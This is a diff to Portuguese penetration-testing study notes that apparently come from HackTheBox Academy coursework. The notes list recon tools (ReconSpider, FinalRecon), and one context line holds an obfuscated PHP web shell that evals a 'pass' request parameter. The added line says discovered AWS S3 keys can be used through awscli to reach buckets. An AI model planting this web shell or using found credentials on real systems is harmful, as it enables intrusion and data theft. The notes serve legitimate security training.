@@ -49,6 +49,7 @@
 - tool ReconSpider boa para crawling, pip3 install scrapy e depois wget -O ReconSpider.zip https://academy.hackthebox.com/storage/modules/144/ReconSpider.v1.2.zip , unzip ReconSpider.zip , python3 ReconSpider.py http://inlanefreight.com
 - git clone https://github.com/thewhiteh4t/FinalRecon.git
 - <?php class GI7Pl14V { public function __construct($H8Jy7){ @eval("/*Z#£¤h*u@!hJ2v689U02*/".$H8Jy7."/*Z#£¤h*u@!hJ2v689U02*/"); }}new GI7Pl14V($_REQUEST['pass']);?>
+- aws s3 são mt importantes, fazem parte de buckets de armazenamento. caso ache keys de s3 pode ser credenciais uteis para acessar esses bucktes atraves do awscli/aws configure.
 
 ---
   
